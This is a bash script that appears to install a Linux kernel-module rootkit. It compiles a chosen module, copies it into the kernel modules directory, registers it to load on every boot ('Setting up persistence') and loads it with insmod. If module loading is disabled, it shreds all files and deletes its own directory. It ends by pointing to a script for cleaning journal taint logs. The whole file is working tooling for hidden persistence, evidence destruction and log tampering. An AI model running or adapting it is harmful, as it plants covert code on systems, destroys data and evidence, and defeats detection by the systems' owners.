#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo "[!] This script must be run as root."
    exit 1
fi

if [ "$(cat /proc/sys/kernel/modules_disabled)" -eq 1 ]; then
    echo "[!] Kernel module loading is disabled on this system."
    echo "[*] Shredding all files and removing current directory..."

    find . -type f -exec shred -u {} \;

    find . -depth -type d -exec rm -rf {} +

    dir_to_delete="$(basename "$PWD")"
    cd ..
    rm -rf "$dir_to_delete"

    echo "[*] Done. Exiting."
    exit 1
fi


read -p "Enter the directory of the LKM: " LKM_DIR
if [ ! -d "$LKM_DIR" ]; then
    echo "[!] Directory '$LKM_DIR' not found."
    exit 1
fi

read -p "Enter the module name (without .ko): " MODULE_NAME

MODULE_DIR="/usr/lib/modules/$(uname -r)/kernel"
CONF_DIR="/etc/modules-load.d"

echo "[*] Compiling the module in $LKM_DIR..."
make -C "$LKM_DIR"
if [ $? -ne 0 ]; then
    echo "[!] Module compilation failed."
    exit 1
fi

KO_FILE="$LKM_DIR/$MODULE_NAME.ko"
if [ ! -f "$KO_FILE" ]; then
    echo "[!] Compiled file '$KO_FILE' not found."
    exit 1
fi

mkdir -p "$MODULE_DIR"
mkdir -p "$CONF_DIR"

echo "[*] Copying $KO_FILE to $MODULE_DIR..."
cp "$KO_FILE" "$MODULE_DIR/$MODULE_NAME.ko"

echo "[*] Running depmod..."
depmod

echo "[*] Setting up persistence..."
echo "$MODULE_NAME" > "$CONF_DIR/$MODULE_NAME.conf"

if lsmod | grep -q "^$MODULE_NAME"; then
    echo "[!] Module already loaded. Removing first..."
    rmmod "$MODULE_NAME"
fi

insmod "$MODULE_DIR/$MODULE_NAME.ko"
if [ $? -eq 0 ]; then
    echo "[+] Module '$MODULE_NAME' loaded successfully!"
else
    echo "[!] Failed to load the module."
fi

echo "[*] Module installed, loaded, and set to load on boot."

echo "[*] Now run 'sudo bash scripts/journal.sh' for clean journal taint logs"